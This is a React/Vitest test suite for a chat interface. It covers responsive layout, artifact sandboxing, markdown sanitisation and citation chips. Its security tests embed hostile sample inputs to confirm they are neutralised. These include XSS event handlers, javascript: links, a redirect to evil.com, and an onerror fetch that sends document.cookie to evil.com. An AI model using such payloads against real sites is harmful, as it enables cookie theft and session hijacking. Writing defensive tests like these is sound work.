import { render, screen, fireEvent } from '@testing-library/react';
import { describe, it, expect } from 'vitest';

import { App } from '../App';
import { ArtifactPanel } from '../components/ArtifactPanel';
import { MessageItem } from '../components/MessageItem';
import { Message } from '../api';

// In Vitest (Node runtime), load css content via dynamic eval-require to keep tsc clean
let cssContent = '';
try {
  const req = eval('require');
  const fs = req('fs');
  const path = req('path');
  cssContent = fs.readFileSync(path.resolve((globalThis as any).process.cwd(), 'src/index.css'), 'utf-8');
} catch {
  cssContent = '';
}

describe('Challenger M3-2 Empirical Adversarial Gate Review Suite', () => {
  // =========================================================================
  // 1. Responsive Layout & 3-Region Dimensions
  // =========================================================================
  describe('1. Responsive Layout & 3-Region Architecture', () => {

    it('defines exact CSS tokens for 3-region responsive layout (desktop sidebar 260px, chat max-w 800px / 70ch, artifact 420px)', () => {
      expect(cssContent).toMatch(/--sidebar-width:\s*260px;/);
      expect(cssContent).toMatch(/--artifact-width:\s*420px;/);
      expect(cssContent).toMatch(/--content-max-width:\s*800px;/);
      expect(cssContent).toMatch(/--content-max-ch:\s*70ch;/);
      expect(cssContent).toMatch(/--header-height:\s*56px;/);
    });

    it('enforces horizontal overflow prevention rules on html, body, and app-shell', () => {
      // html, body must prevent horizontal overflow
      expect(cssContent).toMatch(/html,\s*body\s*\{[^}]*overflow-x:\s*hidden;/);
      expect(cssContent).toMatch(/html,\s*body\s*\{[^}]*max-width:\s*100vw;/);

      // app-shell must have overflow hidden
      expect(cssContent).toMatch(/\.app-shell\s*\{[^}]*overflow:\s*hidden;/);

      // chat-viewport must have min-width: 0 to prevent flex blowout
      expect(cssContent).toMatch(/\.chat-viewport\s*\{[^}]*min-width:\s*0;/);

      // chat-container must enforce max-width content boundary
      expect(cssContent).toMatch(/\.chat-container\s*\{[^}]*max-width:\s*var\(--content-max-width\);/);

      // message-body must enforce 70ch line length constraint
      expect(cssContent).toMatch(/\.message-body\s*\{[^}]*max-width:\s*var\(--content-max-ch\);/);

      // code pre blocks must have horizontal scrolling rather than overflowing
      expect(cssContent).toMatch(/\.message-body\s+pre\s*\{[^}]*overflow-x:\s*auto;/);
    });

    it('contains responsive layout rules for Desktop (>=1024px), Tablet (640-1023px), and Mobile (<640px)', () => {
      // Desktop media query
      expect(cssContent).toContain('@media (min-width: 1024px)');
      expect(cssContent).toMatch(/@media\s*\(min-width:\s*1024px\)\s*\{[\s\S]*?\.app-sidebar\s*\{[\s\S]*?width:\s*var\(--sidebar-width\);/);
      expect(cssContent).toMatch(/@media\s*\(min-width:\s*1024px\)\s*\{[\s\S]*?\.artifact-panel\s*\{[\s\S]*?width:\s*var\(--artifact-width\);/);

      // Tablet media query (drawer mode)
      expect(cssContent).toContain('@media (min-width: 640px) and (max-width: 1023px)');
      expect(cssContent).toMatch(/@media\s*\(min-width:\s*640px\)\s*and\s*\(max-width:\s*1023px\)\s*\{[\s\S]*?\.app-sidebar\s*\{[\s\S]*?position:\s*fixed;/);
      expect(cssContent).toMatch(/@media\s*\(min-width:\s*640px\)\s*and\s*\(max-width:\s*1023px\)\s*\{[\s\S]*?transform:\s*translateX\(-100%\);/);

      // Mobile media query (single column + modal drawer)
      expect(cssContent).toContain('@media (max-width: 639px)');
      expect(cssContent).toMatch(/@media\s*\(max-width:\s*639px\)\s*\{[\s\S]*?\.app-sidebar\s*\{[\s\S]*?position:\s*fixed;/);
      expect(cssContent).toMatch(/@media\s*\(max-width:\s*639px\)\s*\{[\s\S]*?\.artifact-panel\s*\{[\s\S]*?position:\s*fixed;/);
    });

    it('renders the complete 3-region shell components in DOM with semantic landmarks', () => {
      const { container } = render(<App />);

      // Header landmark
      const banner = container.querySelector('header.app-header');
      expect(banner).toBeInTheDocument();

      // Sidebar landmark
      const sidebar = container.querySelector('aside.app-sidebar');
      expect(sidebar).toBeInTheDocument();
      expect(sidebar).toHaveAttribute('aria-label', 'Session navigation');

      // Chat viewport landmark
      const chatArea = container.querySelector('main.chat-viewport');
      expect(chatArea).toBeInTheDocument();

      // Drawer backdrop toggles when sidebar is opened
      const toggleBtn = screen.getByRole('button', { name: /Open sidebar navigation/i });
      fireEvent.click(toggleBtn);

      const backdrop = container.querySelector('.drawer-backdrop');
      expect(backdrop).toBeInTheDocument();

      // Clicking backdrop closes drawer
      fireEvent.click(backdrop!);
      expect(container.querySelector('.drawer-backdrop')).toBeNull();
    });
  });

  // =========================================================================
  // 2. ArtifactPanel Iframe Sandbox Security
  // =========================================================================
  describe('2. ArtifactPanel Security & Sandbox Lockdown', () => {
    it('strictly renders iframe with sandbox="" containing NO allow-scripts or allow-same-origin', () => {
      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            id: 'art-attack-1',
            title: 'Malicious Payload Test',
            type: 'html',
            content: `<!DOCTYPE html><html><body><script>top.location='https://evil.com'</script></body></html>`,
          }}
          onClose={() => {}}
        />
      );

      const iframe = container.querySelector('iframe');
      expect(iframe).toBeInTheDocument();
      expect(iframe).toHaveAttribute('sandbox', '');

      // Verify complete absence of all risky sandbox tokens
      const sandboxValue = iframe?.getAttribute('sandbox') || '';
      expect(sandboxValue).toBe('');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-scripts');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-same-origin');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-forms');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-popups');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-top-navigation');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-modals');
      expect(sandboxValue.toLowerCase()).not.toContain('allow-downloads');
    });

    it('renders the mandatory user-visible security disclosure verbatim', () => {
      render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            title: 'Test Artifact',
            content: '<h1>Hello</h1>',
          }}
          onClose={() => {}}
        />
      );

      const notice = screen.getByText('Sandboxed preview: scripts and external requests are blocked.');
      expect(notice).toBeInTheDocument();
      expect(notice).toHaveClass('artifact-notice');
    });

    it('confines hostile XSS payloads with event handlers and scripts inside sandboxed iframe srcDoc', () => {
      const hostileHtml = `
        <div onmouseover="alert('xss')">Hover me</div>
        <svg onload="document.body.innerHTML='pwned'"></svg>
        <img src="invalid.png" onerror="fetch('https://evil.com?c=' + document.cookie)" />
        <meta http-equiv="refresh" content="0;url=https://evil.com" />
        <base href="https://evil.com/" />
      `;

      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            title: 'Hostile Attack Payload',
            type: 'html',
            content: hostileHtml,
          }}
          onClose={() => {}}
        />
      );

      const iframe = container.querySelector('iframe');
      expect(iframe).toBeInTheDocument();
      expect(iframe).toHaveAttribute('sandbox', '');
      const srcDoc = iframe?.getAttribute('srcdoc') || '';
      expect(srcDoc).toContain('Content-Security-Policy');
      expect(srcDoc).not.toContain('onmouseover');
      expect(srcDoc).not.toContain('onerror');
      expect(srcDoc).not.toContain('http-equiv="refresh"');

      // Verify iframe has accessible title attribute matching artifact title
      expect(iframe).toHaveAttribute('title', 'Hostile Attack Payload');
    });

    it('renders non-HTML markdown artifact safely in a <pre> element without iframe', () => {
      const { container } = render(
        <ArtifactPanel
          isOpen={true}
          artifact={{
            title: 'Markdown Spec',
            type: 'markdown',
            content: '## Executive Summary\n- Deliverable 1\n- Deliverable 2',
          }}
          onClose={() => {}}
        />
      );

      expect(container.querySelector('iframe')).toBeNull();
      const pre = container.querySelector('pre');
      expect(pre).toBeInTheDocument();
      expect(pre).toHaveTextContent('Executive Summary');
    });
  });

  // =========================================================================
  // 3. Safe Markdown Rendering & Link Security
  // =========================================================================
  describe('3. Safe Markdown Rendering & Outbound Link Hardening', () => {
    const makeMsg = (content: string, citations: any[] = []): Message => ({
      id: 'm-test-sec',
      session_id: 's-test',
      role: 'assistant',
      content,
      citations,
      tool_trace: [],
      degraded: false,
      created_at: new Date().toISOString(),
    });

    it('disallows raw HTML and neutralizes embedded scripts, iframes, and active tags', () => {
      const maliciousMarkdown = `
# Normal Heading
<script>window.hacked = true;</script>
<iframe src="https://attacker.com"></iframe>
<img src="x" onerror="window.imgHacked = true;" />
<button onclick="window.btnHacked = true;">Click Me</button>
<object data="data:text/html,<script>alert(1)</script>"></object>
<embed src="flash.swf"></embed>
<form action="https://attacker.com"><input name="pw" /></form>
Some safe text.
      `;

      const { container } = render(<MessageItem message={makeMsg(maliciousMarkdown)} />);

      // None of the malicious HTML tags should be rendered as DOM elements
      expect(container.querySelector('script')).toBeNull();
      expect(container.querySelector('iframe')).toBeNull();
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('object')).toBeNull();
      expect(container.querySelector('embed')).toBeNull();
      expect(container.querySelector('form')).toBeNull();
      expect(container.querySelector('input')).toBeNull();

      // Heading and text render cleanly
      expect(screen.getByRole('heading', { level: 1 })).toHaveTextContent('Normal Heading');
      expect(screen.getByText(/Some safe text\./)).toBeInTheDocument();
    });

    it('enforces target="_blank" and rel="noopener noreferrer" on all external links', () => {
      const markdown = `
Visit [Lenny Newsletter](https://www.lennysnewsletter.com) and [Podcast](https://www.lennyspodcast.com).
Also [Documentation](https://example.com/docs).
      `;

      const { container } = render(<MessageItem message={makeMsg(markdown)} />);

      const links = container.querySelectorAll('a');
      expect(links.length).toBe(3);

      links.forEach((a) => {
        expect(a).toHaveAttribute('target', '_blank');
        expect(a).toHaveAttribute('rel', 'noopener noreferrer');
        expect(a.getAttribute('href')).toMatch(/^https:\/\//);
      });
    });

    it('neutralizes adversarial javascript: links by setting href="#" while maintaining target and rel', () => {
      const attackMarkdown = `
[Attack 1](javascript:alert('pwn1'))
[Attack 2](JAVASCRIPT:alert('pwn2'))
[Attack 3](  javascript:alert('pwn3'))
[Attack 4](javascript:void(0))
      `;

      const { container } = render(<MessageItem message={makeMsg(attackMarkdown)} />);

      const links = container.querySelectorAll('a');
      expect(links.length).toBe(4);

      links.forEach((a) => {
        expect(a.getAttribute('href')).toBe('#');
        expect(a).toHaveAttribute('target', '_blank');
        expect(a).toHaveAttribute('rel', 'noopener noreferrer');
      });
    });

    it('transforms inline citation tags [S1], [S2] into interactive buttons, NOT external <a> links', () => {
      const textWithCitations = 'PMF is organic pull [S1]. Retention is the flywheel [S2].';
      const { container } = render(
        <MessageItem
          message={makeMsg(textWithCitations, [
            {
              n: 1,
              chunk_id: 'chk-1',
              doc_slug: 'pod-1',
              title: 'Ep 1',
              guest: 'Guest 1',
              passage: 'Passage 1',
            },
            {
              n: 2,
              chunk_id: 'chk-2',
              doc_slug: 'pod-2',
              title: 'Ep 2',
              guest: 'Guest 2',
              passage: 'Passage 2',
            },
          ])}
        />
      );

      // Buttons for inline citations inside message body
      const inlineChips = container.querySelectorAll('.message-body button.citation-chip');
      expect(inlineChips.length).toBe(2);
      expect(inlineChips[0]).toHaveAttribute('aria-label', 'Jump to source S1');
      expect(inlineChips[1]).toHaveAttribute('aria-label', 'Jump to source S2');

      // Total chips (2 inline + 2 in accordion group)
      const allChips = container.querySelectorAll('button.citation-chip');
      expect(allChips.length).toBe(4);

      // No external <a> links generated for citations
      const externalLinks = container.querySelectorAll('a');
      expect(externalLinks.length).toBe(0);
    });

    it('displays degraded badge with warning icon when message.degraded === true', () => {
      const degradedMsg: Message = {
        ...makeMsg('Answer generated in degraded mode without agent runtime.'),
        degraded: true,
        latency_ms: 3200,
      };

      render(<MessageItem message={degradedMsg} />);

      const badge = screen.getByTitle('Answered in degraded fallback mode without agent runtime');
      expect(badge).toBeInTheDocument();
      expect(badge).toHaveTextContent('Degraded');
      expect(screen.getByText('3.2s')).toBeInTheDocument();
    });
  });
});
